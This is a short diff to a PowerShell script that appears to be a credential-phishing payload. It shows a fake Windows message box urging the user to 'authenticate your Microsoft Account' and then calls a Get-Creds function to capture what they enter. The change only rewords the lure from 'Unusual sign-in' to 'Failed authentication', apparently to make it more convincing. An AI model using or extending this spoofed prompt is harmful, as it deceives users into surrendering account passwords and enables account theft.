@@ -90,7 +90,7 @@ Caps-Off
 
 Add-Type -AssemblyName System.Windows.Forms
 
-[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")
+[System.Windows.Forms.MessageBox]::Show("Failed authentication. Please authenticate your Microsoft Account")
 
 $creds = Get-Creds
 
